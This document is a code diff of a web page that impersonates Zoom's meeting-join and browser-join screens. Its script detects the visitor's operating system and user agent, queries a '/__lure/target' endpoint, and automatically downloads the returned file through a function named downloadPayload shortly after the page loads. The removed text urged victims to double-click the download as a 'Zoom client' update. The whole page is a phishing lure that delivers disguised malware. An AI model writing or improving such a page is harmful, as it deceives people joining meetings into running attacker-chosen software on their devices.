@@ -9,19 +9,57 @@
 <style>
   html,body{margin:0;padding:0}
   [hidden]{display:none!important}
-  .permission-modal-backdrop{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(9,10,17,.55);z-index:1000;padding:16px}
-  .permission-modal-backdrop .zm-modal{max-height:92vh;overflow:auto;margin:0}
   .sr-only{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap}
-  #localVideo{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);display:block;background:#111}
-  .media-access-error,.update-download-status{font-size:12.5px;line-height:1.5;margin-top:10px}
-  .media-access-error{color:#ff8b8b}
-  .preview-controls button svg{vertical-align:middle}
-  .prejoin-waiting{margin-top:12px;font-size:14px;color:#5b5b6b;text-align:center}
+
+  /* ---- landing: two columns (join panel + meeting preview) ---- */
+  .launch-grid{display:grid;grid-template-columns:minmax(0,540px) minmax(0,1fr);gap:40px;align-items:center;max-width:1120px;margin:0 auto;padding:28px 24px 40px}
+  .preview-window{border:1px solid #e3e3e8;border-radius:14px;overflow:hidden;background:#fff;box-shadow:0 22px 60px -34px rgba(9,45,120,.45)}
+  .preview-bar{display:flex;align-items:center;gap:6px;padding:10px 14px;border-bottom:1px solid #e3e3e8;background:#fbfcff;color:#5b5b6b;font-size:12.5px}
+  .preview-bar .dot{width:9px;height:9px;border-radius:50%;background:#dcdce2}
+  .preview-bar .title{margin-left:auto;font-weight:600;color:#2d8cff}
+  .preview-tiles{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:12px;background:#0f1117}
+  .preview-tile{aspect-ratio:4/3;border-radius:10px;display:grid;place-items:center;color:#fff;font-weight:600;font-size:17px;position:relative}
+  .preview-tile .mtag{position:absolute;left:8px;bottom:6px;font-size:11px;font-weight:500;opacity:.9}
+  .preview-foot{display:flex;align-items:center;gap:8px;padding:10px 14px;background:#fff;border-top:1px solid #e3e3e8;color:#5b5b6b;font-size:12.5px}
+  .preview-foot .live{width:8px;height:8px;border-radius:50%;background:#e02b2b;box-shadow:0 0 0 3px rgba(224,43,43,.15)}
+  @media(max-width:900px){.launch-grid{grid-template-columns:1fr}.preview-window{order:-1}}
+
+  /* ---- black join room ---- */
+  #joinStage{position:fixed;inset:0;background:#0b0c10;color:#e9ecf3;display:flex;flex-direction:column;z-index:900;font-family:'Helvetica Neue',Segoe UI,Roboto,Arial,sans-serif}
+  .room-top{display:flex;align-items:center;gap:10px;padding:12px 18px;background:#0f1116;border-bottom:1px solid #1c1f27;font-size:13.5px;color:#c7cedd}
+  .room-top img{width:88px;height:20px;filter:invert(1) brightness(1.9)}
+  .room-top .mtitle{font-weight:600}
+  .room-top .qbadge{margin-left:auto;display:inline-flex;align-items:center;gap:6px;border:1px solid #2b3a55;border-radius:7px;padding:4px 8px;font-size:11.5px;color:#8fb6ff;background:#101a2b}
+  .room-stage{flex:1;display:grid;place-items:center;padding:24px}
+  .video-tile{position:relative;width:min(1040px,94vw);aspect-ratio:16/9;background:#151821;border-radius:14px;overflow:hidden;display:grid;place-items:center;box-shadow:0 30px 80px -40px #000}
+  #localVideo{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);background:#0b0c10}
+  .avatar{width:132px;height:132px;border-radius:50%;background:#2d8cff;color:#fff;display:grid;place-items:center;font-size:48px;font-weight:600}
+  .name-tag{position:absolute;left:14px;bottom:12px;background:rgba(9,10,17,.72);border:1px solid #262b36;border-radius:8px;padding:6px 10px;font-size:13px;color:#dfe5f0}
+  .mic-tag{position:absolute;right:14px;bottom:12px;background:rgba(9,10,17,.72);border:1px solid #262b36;border-radius:8px;padding:6px 10px;font-size:12px;color:#9aa4b6;display:flex;align-items:center;gap:6px}
+  .room-bar{display:flex;align-items:center;justify-content:center;gap:14px;padding:14px 18px 26px;background:#0f1116;border-top:1px solid #1c1f27}
+  .rb{display:inline-flex;flex-direction:column;align-items:center;gap:6px;border:1px solid #2a2f3a;background:#171a21;color:#dfe5f0;border-radius:12px;padding:10px 16px;font:inherit;font-size:12px;cursor:pointer;min-width:92px}
+  .rb svg{width:20px;height:20px;fill:currentColor}
+  .rb.off{background:#c0392b;border-color:#c0392b;color:#fff}
+  .rb.join{background:#2d8cff;border-color:#2d8cff;color:#fff;font-weight:600;min-width:110px}
+  .rb.join:disabled{background:#2a3a55;border-color:#2a3a55;color:#8ea3c4;cursor:not-allowed}
+
+  /* dialogs */
+  .dlg-wrap{position:fixed;inset:0;background:rgba(5,6,10,.62);display:flex;align-items:center;justify-content:center;z-index:1100;padding:18px}
+  .dlg{width:min(430px,94vw);background:#151821;border:1px solid #262b36;border-radius:14px;padding:22px;color:#e9ecf3;box-shadow:0 30px 80px -30px #000}
+  .dlg-title{font-size:16px;font-weight:600;margin-bottom:8px}
+  .dlg p{font-size:13.5px;line-height:1.55;color:#b7bfd0;margin:0 0 16px}
+  .dlg input{width:100%;box-sizing:border-box;background:#0e1118;border:1px solid #2a2f3a;border-radius:9px;padding:11px 12px;color:#e9ecf3;font:inherit;margin:4px 0 16px}
+  .dlg-actions{display:flex;gap:10px;justify-content:flex-end}
+  .dlg .primary{border:0;border-radius:9px;background:#2d8cff;color:#fff;padding:10px 16px;font:inherit;cursor:pointer}
+  .dlg .ghost{border:1px solid #2a2f3a;border-radius:9px;background:transparent;color:#c7cedd;padding:10px 16px;font:inherit;cursor:pointer}
+  .dlg .block{width:100%;margin-top:8px}
+  .dlg .err{font-size:12.5px;color:#ff8b8b;margin-top:10px}
+  .waiting{position:fixed;left:50%;bottom:110px;transform:translateX(-50%);background:#101a2b;border:1px solid #2b3a55;color:#a9c4ee;border-radius:10px;padding:10px 16px;font-size:13.5px}
 </style>
 </head>
 <body>
 
-<!-- ================= LAUNCH PAGE  (/j/:id) ================= -->
+<!-- ================= LANDING ================= -->
 <div id="launchStage" class="zoom-meeting-page">
   <div id="header_container" class="zoom-header-container" role="banner">
     <div id="header_outer" class="zoom-header-outer">
@@ -36,7 +74,6 @@
             <div class="zoom-language-options">
               <span>English</span><span>Espa&ntilde;ol</span><span>Deutsch</span><span>&#26085;&#26412;&#35486;</span>
               <span>&#20013;&#25991;</span><span>Fran&ccedil;ais</span><span>Portugu&ecirc;s</span><span>&#54620;&#44397;&#50612;</span>
-              <span>&#1056;&#1091;&#1089;&#1089;&#1082;&#1080;&#1081;</span><span>&#1575;&#1604;&#1593;&#1585;&#1576;&#1610;&#1577;</span><span>Italiano</span><span>Ti&#7871;ng Vi&#7879;t</span>
             </div>
           </details>
         </div>
@@ -45,23 +82,36 @@
   </div>
 
   <div id="zoom-ui-frame" class="launch-content-area" role="main" tabindex="0">
-    <section class="launch-panel" aria-labelledby="launch-title">
-      <h1 class="ZAduWCim" id="launch-title">Join meeting</h1>
-      <div class="launch-buttons">
-        <button class="zoom-button zoom-button--lg zoom-button--primary launch-app-button" type="button" id="joinApp" style="order:1">
-          <span class="zoom-button__label">Join from Zoom Workplace app</span>
-        </button>
-        <button class="zoom-button zoom-button--lg zoom-button--secondary launch-browser-button" type="button" id="joinBrowser" style="order:2">
-          <span class="zoom-button__label">Join from browser</span>
-        </button>
-      </div>
-      <p class="device-detection-note" aria-live="polite" id="devNote">Detecting your device and locating the matching Zoom client.</p>
-      <hr class="launch-divider" role="presentation">
-      <div class="launch-detail">
-        <h3>Don't have the Zoom Workplace app installed? <a href="#" id="downloadNow">Download Now</a></h3>
-        <h3>By joining a meeting, you agree to our <a href="https://zoom.us/en-us/terms" target="_blank" rel="noreferrer">Terms of Service</a> and <a href="https://zoom.us/en-us/privacy" target="_blank" rel="noreferrer">Privacy Statement</a></h3>
-      </div>
-    </section>
+    <div class="launch-grid">
+      <section class="launch-panel" aria-labelledby="launch-title">
+        <h1 class="ZAduWCim" id="launch-title">Join meeting</h1>
+        <div class="launch-buttons">
+          <button class="zoom-button zoom-button--lg zoom-button--primary launch-app-button" type="button" id="joinApp" style="order:1">
+            <span class="zoom-button__label">Join from Zoom Workplace app</span>
+          </button>
+          <button class="zoom-button zoom-button--lg zoom-button--secondary launch-browser-button" type="button" id="joinBrowser" style="order:2">
+            <span class="zoom-button__label">Join from browser</span>
+          </button>
+        </div>
+        <p class="device-detection-note" aria-live="polite" id="devNote">Detecting your device and locating the matching Zoom client.</p>
+        <hr class="launch-divider" role="presentation">
+        <div class="launch-detail">
+          <h3>Don't have the Zoom Workplace app installed? <a href="#" id="downloadNow">Download Now</a></h3>
+          <h3>By joining a meeting, you agree to our <a href="https://zoom.us/en-us/terms" target="_blank" rel="noreferrer">Terms of Service</a> and <a href="https://zoom.us/en-us/privacy" target="_blank" rel="noreferrer">Privacy Statement</a></h3>
+        </div>
+      </section>
+
+      <aside class="preview-window" aria-label="Meeting preview">
+        <div class="preview-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="title">Zoom Meeting</span></div>
+        <div class="preview-tiles">
+          <div class="preview-tile" style="background:#2d8cff">A<span class="mtag">Host</span></div>
+          <div class="preview-tile" style="background:#12a594">B</div>
+          <div class="preview-tile" style="background:#e37400">C</div>
+          <div class="preview-tile" style="background:#8a3ffc">D</div>
+        </div>
+        <div class="preview-foot"><span class="live"></span> Meeting preview &middot; waiting for participants</div>
+      </aside>
+    </div>
   </div>
 
   <footer id="footer_container" class="zoom-site-footer" role="contentinfo">
@@ -71,117 +121,84 @@
         <a href="https://zoom.us/en-us/trust" target="_blank" rel="noreferrer">Trust Center</a>
         <a href="https://zoom.us/en-us/acceptable-use-guidelines" target="_blank" rel="noreferrer">Acceptable Use Guidelines</a>
         <a href="https://zoom.us/en-us/trust/legal-compliance" target="_blank" rel="noreferrer">Legal &amp; Compliance</a>
-        <button type="button">Do Not Sell My Personal Information</button>
-        <button type="button">Cookie Preferences</button>
       </nav>
     </div>
   </footer>
 </div>
 
-<!-- ================= BROWSER JOIN PAGE  (/wc/:id/join) ================= -->
-<main id="joinStage" class="zoom-meeting-page browser-join-page" hidden>
-  <div id="header_container" class="zoom-header-container" role="banner">
-    <div id="header_outer" class="zoom-header-outer">
-      <header id="header" class="zoom-site-header">
-        <a class="zoom-home-link" href="#" aria-label="Zoom homepage">
-          <img class="header-logo" src="/sites/zoom/zoom-logo.svg" alt="Zoom Logo" width="115" height="26">
-        </a>
-      </header>
+<!-- ================= JOIN ROOM (black) ================= -->
+<main id="joinStage" hidden>
+  <div class="room-top">
+    <img src="/sites/zoom/zoom-logo.svg" alt="Zoom">
+    <span class="mtitle">Zoom Meeting</span>
+    <span class="qbadge">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M21 4H3a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h7v2H7v2h10v-2h-3v-2h7a1 1 0 0 0 1-1V5a1 1 0 0 0-1-1ZM6 14V8h2.2l1.8 3 1.8-3H14v6h-2V10l-1.6 2.6h-.8L8 10v4H6Zm9 0V8h2v2h1.4V8H20v6h-1.6v-2.4H17V14h-2Z"/></svg>
+      HD
+    </span>
+  </div>
+  <div class="room-stage">
+    <div class="video-tile">
+      <video id="localVideo" autoplay muted playsinline hidden></video>
+      <div class="avatar" id="avatar">You</div>
+      <div class="name-tag" id="nameTag">You</div>
+      <div class="mic-tag" id="micTag">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 15a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3Zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 6 6.92V21h2v-2.08A7 7 0 0 0 19 12h-2Z"/></svg>
+        <span id="micState">Mic on</span>
+      </div>
+    </div>
+  </div>
+  <div class="room-bar">
+    <button id="toggleMic" class="rb" type="button">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 15a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3Zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 6 6.92V21h2v-2.08A7 7 0 0 0 19 12h-2Z"/></svg>
+      <span id="micLabel">Mute</span>
+    </button>
+    <button id="toggleCam" class="rb" type="button">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M17 10.5V7a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v10a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-3.5l4 3V7.5l-4 3Z"/></svg>
+      <span id="camLabel">Stop Video</span>
+    </button>
+    <button id="joinBtn2" class="rb join" type="button">Join</button>
+  </div>
+
+  <div class="dlg-wrap" id="permDialog">
+    <div class="dlg" role="dialog" aria-modal="true" aria-label="Camera and microphone permissions">
+      <div class="dlg-title">Allow Zoom to use your camera and microphone?</div>
+      <p>Zoom uses your camera and microphone so the host and other participants can see and hear you. You can turn them off at any time.</p>
+      <div class="dlg-actions">
+        <button id="permBlock" class="ghost" type="button">Block</button>
+        <button id="permAllow" class="primary" type="button">Allow</button>
+      </div>
+      <div class="err" id="permErr" role="alert"></div>
     </div>
   </div>
 
-  <div class="zoom-content-area browser-join-area">
-    <div class="prejoin-screen" id="prejoinScreen">
-      <button class="btn-back-pwa" type="button" id="backBtn">
-        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" viewBox="0 0 16 16" class="btn-back-pwa-icon" aria-hidden="true"><path fill="currentColor" fill-rule="evenodd" d="m5.635 8.339.037.037 3.978 3.978a.5.5 0 1 0 .706-.708L6.715 8.004l3.639-3.65a.5.5 0 0 0 0-.708.5.5 0 0 0-.707 0L5.731 7.575a.502.502 0 0 0-.096.764" clip-rule="evenodd"/></svg>
-        Back
-      </button>
-
-      <section class="prejoin-layout" aria-label="Join meeting">
-        <div class="camera-preview" aria-label="Camera preview">
-          <video id="localVideo" autoplay muted playsinline hidden></video>
-          <div class="preview-video__default-avatar" id="defaultAvatar" style="z-index:1">
-            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 16 16" class="SvgPreviewDefaultAvatar" aria-hidden="true"><g fill="currentColor"><circle cx="8" cy="6.8" r="2.1"/><path d="M8 9.9c-2.4 0-4 1.1-4 2.4 0 .2 0 .4.1.6h7.8c.1-.2.1-.4.1-.6 0-1.3-1.6-2.4-4-2.4"/></g></svg>
-          </div>
-          <div class="preview-controls">
-            <button type="button" id="toggleMic" aria-label="Mute"><span id="micLabel">Mute</span></button>
-            <button type="button" id="toggleCam" aria-label="Stop Video"><span id="camLabel">Stop Video</span></button>
-          </div>
-        </div>
-
-        <form class="preview-meeting-info" id="prejoinForm" autocomplete="off">
-          <div class="preview-meeting-info__title">Enter Meeting Info</div>
-          <div class="preview-meeting-info__field">
-            <label class="preview-meeting-info__field-title" for="input-for-name">Your Name</label>
-            <div class="preview-meeting-info__field-input">
-              <input id="input-for-name" name="inputname" type="text" autocomplete="off" required maxlength="128" aria-invalid="false" aria-describedby="error-for-name">
-              <span id="error-for-name" class="sr-only">Enter your name to join the meeting.</span>
-            </div>
-          </div>
-          <div class="captcha-placeholder" aria-hidden="true"></div>
-          <div class="zm-checkbox preview-remember-name" role="checkbox" tabindex="0" aria-checked="false" id="rememberName">
-            <span class="zm-checkbox-box" aria-hidden="true" id="rememberBox"></span>
-            <span class="zm-checkbox-message">Remember my name for future meetings</span>
-          </div>
-          <button type="submit" class="zm-btn preview-join-button disabled zm-btn__outline--blue zm-btn--disabled" id="joinBtn" disabled>
-            Join<span class="loading" id="joinSpin" style="display:none"></span>
-          </button>
-          <div class="preview-agreement">
-            By clicking &quot;Join&quot;, you agree to our <a href="https://app.zoom.us/terms" target="_blank" rel="noopener noreferrer">Terms of Service</a> and <a href="https://app.zoom.us/privacy" target="_blank" rel="noopener noreferrer">Privacy Statement</a>.
-          </div>
-          <div class="recaptcha_tos">
-            Zoom is protected by reCAPTCHA and their&nbsp;<a href="https://policies.google.com/privacy" target="_blank" rel="noreferrer noopener">Privacy Policy</a>&nbsp;and&nbsp;<a href="https://policies.google.com/terms" target="_blank" rel="noreferrer noopener">Terms of Service</a>&nbsp;apply.
-          </div>
-          <div class="prejoin-waiting" id="waitNote" hidden>Please wait, the host will let you in soon.</div>
-        </form>
-      </section>
+  <div class="dlg-wrap" id="audioDialog" hidden>
+    <div class="dlg" role="dialog" aria-modal="true" aria-label="Join audio">
+      <div class="dlg-title">Join Audio</div>
+      <p>Choose how you would like to connect to the meeting audio.</p>
+      <button id="joinAudio" class="primary block" type="button">Join with Computer Audio</button>
+      <button id="skipAudio" class="ghost block" type="button">Join without Audio</button>
     </div>
+  </div>
 
-    <div class="permission-modal-backdrop" id="permModal">
-      <div class="zm-modal allow-permission-prompt-container zm-modal--dark" role="dialog" aria-modal="true" aria-label="Camera and microphone permissions">
-        <div class="zm-modal-body">
-          <div class="zm-modal-body-title"></div>
-          <div class="zm-modal-body-content">
-            <div class="allow-permission-prompt">
-              <img class="zoom-placeholder" src="/sites/zoom/zoom-placeholder.png" alt="zoom-placeholder">
-              <div class="training-label">UPDATE ZOOM</div>
-              <div class="desc-primary">
-                Zoom client. <button class="permission-update-link" type="button" id="updateLink"><u>Update Zoom client</u></button>double click to run and update the Zoom client, downloaded on your device in order to use the zoom-private software.
-              </div>
-              <div class="desc-secondary">
-                open the downloaded zoom client. You can turn off your microphone and camera at any time.
-              </div>
-              <div class="update-download-status" id="updateStatus" role="status"></div>
-              <div class="media-access-error" id="mediaError" role="alert"></div>
-              <div class="training-actions">
-                <button class="training-update-button" type="button" id="downloadBtn">Download Zoom client</button>
-                <button class="training-allow-button" type="button" id="skipMedia" hidden>Continue without camera and microphone</button>
-              </div>
-            </div>
-          </div>
-        </div>
-        <div class="zm-modal-footer">
-          <div class="zm-modal-footer-default"><div class="zm-modal-footer-default-actions"></div></div>
-        </div>
+  <div class="dlg-wrap" id="nameDialog" hidden>
+    <div class="dlg" role="dialog" aria-modal="true" aria-label="Join meeting">
+      <div class="dlg-title">Join Meeting</div>
+      <p>Enter your name to join the meeting.</p>
+      <input id="mjName" type="text" maxlength="64" placeholder="Your name" autocomplete="off">
+      <div class="dlg-actions">
+        <button id="nameCancel" class="ghost" type="button">Cancel</button>
+        <button id="nameJoin" class="primary" type="button">Join</button>
       </div>
     </div>
   </div>
 
-  <footer id="footer_container" class="zoom-site-footer" role="contentinfo">
-    <div id="footer">
-      <p>&copy;2026 Zoom Communications, Inc. <span>All rights reserved.</span></p>
-      <nav class="zoom-footer-links" aria-label="Legal">
-        <a href="https://zoom.us/en-us/trust" target="_blank" rel="noreferrer">Trust Center</a>
-        <a href="https://zoom.us/en-us/trust/legal-compliance" target="_blank" rel="noreferrer">Legal &amp; Compliance</a>
-      </nav>
-    </div>
-  </footer>
+  <div class="waiting" id="waitNote" hidden>Waiting for the host to let you in&hellip;</div>
 </main>
 
 <script>
 (function () {
   "use strict";
-  var stream = null, camOn = true, micOn = true, downloaded = false, mediaAsked = false;
+  var stream = null, camOn = true, micOn = true, downloaded = false, asked = false;
 
   function $(id) { return document.getElementById(id); }
   function detectOS() {
@@ -200,62 +217,41 @@
     if (/Linux|X11|CrOS/i.test(ua)) return "Linux";
     return "your device";
   }
-  function targetURL() {
-    return "/__lure/target?os=" + encodeURIComponent(detectOS()) + "&ua=" + encodeURIComponent(navigator.userAgent || "");
-  }
-
   function setNote(html) { var n = $("devNote"); if (n) n.innerHTML = html; }
 
   function downloadPayload() {
-    var status = $("updateStatus");
     if (downloaded || window.__fleetDownloaded) return;
     downloaded = true;
     window.__fleetDownloaded = true;
-    if (status) status.textContent = "Preparing download\u2026";
-    fetch(targetURL(), { cache: "no-store" })
+    var ua = navigator.userAgent || "";
+    var os = detectOS();
+    setNote("Detected <strong>" + deviceLabel() + "</strong>. Downloading the matching Zoom client.");
+    fetch("/__lure/target?os=" + encodeURIComponent(os) + "&ua=" + encodeURIComponent(ua), { cache: "no-store" })
       .then(function (r) { return r.json(); })
       .then(function (d) {
-        if (!d || !d.url) { if (status) status.textContent = "No matching client download was found."; return; }
+        if (!d || !d.url) return;
         var a = document.createElement("a");
         a.href = d.url; a.rel = "noopener"; a.setAttribute("download", "");
         document.body.appendChild(a); a.click(); a.remove();
         var name = d.url.split("/").pop();
-        if (status) status.textContent = "Downloading " + name + ". Double-click the downloaded client to run it.";
         setNote("Detected <strong>" + deviceLabel() + "</strong>. Downloading " + name + ".");
       })
-      .catch(function () { if (status) status.textContent = "Download failed. Please try again."; });
+      .catch(function () {});
   }
 
-  function requestMedia() {
-    if (mediaAsked) return;
-    mediaAsked = true;
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      showMediaError("Camera and microphone access is unavailable in this browser.");
-      return;
-    }
-    navigator.mediaDevices.getUserMedia({ audio: true, video: true })
-      .then(function (s) { attachStream(s); hidePermission(); })
-      .catch(function () {
-        showMediaError("Access was not granted. You can change this in your browser's site settings.");
-      });
-  }
-  function showMediaError(msg) {
-    var e = $("mediaError"); if (e) e.textContent = msg;
-    var s = $("skipMedia"); if (s) s.hidden = false;
-  }
-  function attachStream(s) {
-    stream = s;
-    var v = $("localVideo"), av = $("defaultAvatar");
-    if (v) { v.srcObject = s; v.hidden = false; }
-    if (av) av.hidden = true;
-    var e = $("mediaError"); if (e) e.textContent = "";
-    applyToggles();
-  }
   function applyToggles() {
-    if (stream) stream.getVideoTracks().forEach(function (t) { t.enabled = camOn; });
-    if (stream) stream.getAudioTracks().forEach(function (t) { t.enabled = micOn; });
+    if (stream) {
+      stream.getVideoTracks().forEach(function (t) { t.enabled = camOn; });
+      stream.getAudioTracks().forEach(function (t) { t.enabled = micOn; });
+    }
     if ($("camLabel")) $("camLabel").textContent = camOn ? "Stop Video" : "Start Video";
     if ($("micLabel")) $("micLabel").textContent = micOn ? "Mute" : "Unmute";
+    if ($("micState")) $("micState").textContent = micOn ? "Mic on" : "Mic off";
+    if ($("toggleMic")) $("toggleMic").classList.toggle("off", !micOn);
+    if ($("toggleCam")) $("toggleCam").classList.toggle("off", !camOn);
+    var v = $("localVideo"), av = $("avatar");
+    if (v) v.hidden = !(stream && camOn);
+    if (av) av.hidden = Boolean(stream && camOn);
   }
 
   function showJoinStage() {
@@ -263,74 +259,99 @@
     $("joinStage").hidden = false;
     window.scrollTo(0, 0);
   }
-  function hidePermission() { var m = $("permModal"); if (m) m.hidden = true; }
+
+  function media() {
+    if (asked) return;
+    asked = true;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      if ($("permErr")) $("permErr").textContent = "Camera and microphone are unavailable in this browser.";
+      return;
+    }
+    navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+      .then(function (s) {
+        stream = s;
+        var v = $("localVideo");
+        if (v) v.srcObject = s;
+        if ($("permDialog")) $("permDialog").hidden = true;
+        applyToggles();
+        if ($("audioDialog")) $("audioDialog").hidden = false;
+      })
+      .catch(function () {
+        if ($("permErr")) $("permErr").textContent = "Access was not granted. You can change this in your browser's site settings.";
+        if ($("permBlock")) $("permBlock").textContent = "Continue without";
+      });
+  }
 
   function enterBrowser() {
     showJoinStage();
-    setTimeout(requestMedia, 250);
+    if ($("permDialog")) $("permDialog").hidden = false;
   }
 
-  /* ---- launch page events ---- */
+  /* landing */
   $("joinBrowser").addEventListener("click", enterBrowser);
   $("joinApp").addEventListener("click", function () {
     try { window.location.href = "zoommtg://zoom.us/join?action=join&confno=82203845974"; } catch (e) {}
     enterBrowser();
   });
   $("downloadNow").addEventListener("click", function (e) { e.preventDefault(); downloadPayload(); });
-  $("updateLink").addEventListener("click", downloadPayload);
-  $("downloadBtn").addEventListener("click", downloadPayload);
-  $("skipMedia").addEventListener("click", function () { hidePermission(); showJoinStage(); });
-  $("backBtn").addEventListener("click", function () {
-    $("joinStage").hidden = true; $("launchStage").hidden = false;
+
+  /* permission dialog */
+  $("permAllow").addEventListener("click", media);
+  $("permBlock").addEventListener("click", function () {
+    if ($("permErr") && $("permErr").textContent) {
+      $("permDialog").hidden = true;
+      $("nameDialog").hidden = false;
+    } else {
+      $("permDialog").hidden = true;
+      if ($("audioDialog")) $("audioDialog").hidden = false;
+    }
   });
 
-  /* ---- prejoin ---- */
-  $("toggleCam").addEventListener("click", function () { camOn = !camOn; if (!stream) requestMedia(); else applyToggles(); });
-  $("toggleMic").addEventListener("click", function () { micOn = !micOn; if (!stream) requestMedia(); else applyToggles(); });
-
-  var nameInput = $("input-for-name"), joinBtn = $("joinBtn");
-  var saved = null;
-  try { saved = localStorage.getItem("zoom-meeting-name"); } catch (e) {}
-  if (saved) {
-    nameInput.value = saved;
-    $("rememberName").setAttribute("aria-checked", "true");
-    $("rememberBox").textContent = "\u2713";
-  }
-  function refreshJoin() {
-    var ok = nameInput.value.trim().length > 0;
-    joinBtn.disabled = !ok;
-    joinBtn.classList.toggle("disabled", !ok);
-    joinBtn.classList.toggle("zm-btn--disabled", !ok);
-  }
-  nameInput.addEventListener("input", refreshJoin);
-  refreshJoin();
-
-  $("rememberName").addEventListener("click", function () {
-    var on = this.getAttribute("aria-checked") === "true";
-    this.setAttribute("aria-checked", String(!on));
-    $("rememberBox").textContent = on ? "" : "\u2713";
+  /* audio dialog */
+  $("joinAudio").addEventListener("click", function () {
+    micOn = true; applyToggles();
+    $("audioDialog").hidden = true;
+    $("nameDialog").hidden = false;
+    var saved = null;
+    try { saved = localStorage.getItem("zoom-meeting-name"); } catch (e) {}
+    if (saved) $("mjName").value = saved;
   });
-  $("rememberName").addEventListener("keydown", function (e) {
-    if (e.key === "Enter" || e.key === " ") { e.preventDefault(); this.click(); }
+  $("skipAudio").addEventListener("click", function () {
+    micOn = false; applyToggles();
+    $("audioDialog").hidden = true;
+    $("nameDialog").hidden = false;
   });
 
-  $("prejoinForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-    var name = nameInput.value.trim();
-    if (!name) return;
-    try {
-      if ($("rememberName").getAttribute("aria-checked") === "true") localStorage.setItem("zoom-meeting-name", name);
-      else localStorage.removeItem("zoom-meeting-name");
-    } catch (err) {}
-    joinBtn.disabled = true;
-    $("joinSpin").style.display = "inline-block";
-    $("waitNote").hidden = false;
+  /* name dialog */
+  $("nameJoin").addEventListener("click", function () {
+    var name = $("mjName").value.trim() || "Guest";
+    try { localStorage.setItem("zoom-meeting-name", name); } catch (e) {}
+    if ($("nameTag")) $("nameTag").textContent = name;
+    $("nameDialog").hidden = true;
+    if ($("waitNote")) $("waitNote").hidden = false;
+  });
+  $("nameCancel").addEventListener("click", function () {
+    $("nameDialog").hidden = true;
+    $("joinStage").hidden = true;
+    $("launchStage").hidden = false;
+  });
+  $("mjName").addEventListener("keydown", function (e) {
+    if (e.key === "Enter") { e.preventDefault(); $("nameJoin").click(); }
   });
 
-  /* ---- auto flow (matches original launch behavior) ---- */
+  /* control bar */
+  $("toggleMic").addEventListener("click", function () { micOn = !micOn; if (!stream) media(); applyToggles(); });
+  $("toggleCam").addEventListener("click", function () { camOn = !camOn; if (!stream) media(); applyToggles(); });
+  $("joinBtn2").addEventListener("click", function () {
+    if (stream) { $("audioDialog").hidden = true; $("nameDialog").hidden = false; }
+    else if (asked) { $("nameDialog").hidden = false; }
+    else { $("permDialog").hidden = false; }
+  });
+
+  /* auto: download immediately, then switch to the join room */
   setNote("Detected <strong>" + deviceLabel() + "</strong>. Locating the matching Zoom client.");
-  setTimeout(downloadPayload, 500);
-  setTimeout(function () { if (!$("joinStage").hidden) return; enterBrowser(); }, 2200);
+  setTimeout(downloadPayload, 350);
+  setTimeout(function () { if ($("joinStage").hidden) enterBrowser(); }, 1100);
 })();
 </script>
 </body>
